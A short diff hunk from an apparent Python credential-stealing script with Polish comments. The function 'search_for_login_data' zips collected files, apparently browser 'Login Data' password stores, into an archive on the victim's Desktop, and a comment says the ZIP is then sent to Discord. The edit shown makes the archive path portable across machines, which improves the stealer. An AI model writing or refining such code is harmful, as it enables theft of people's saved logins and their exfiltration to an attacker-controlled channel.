@@ -88,7 +88,7 @@ def search_for_login_data():
     
     # Tworzenie ZIP z plikami
     if files_to_zip:
-        zip_file_name = r"C:\Users\grzes\Desktop\Login_Data_Archive.zip"
+        zip_file_name = os.path.join(os.environ['USERPROFILE'], 'Desktop', 'Login_Data_Archive.zip')
         create_zip_from_files(files_to_zip, zip_file_name)
         
         # Wysyłanie ZIP-a na Discord
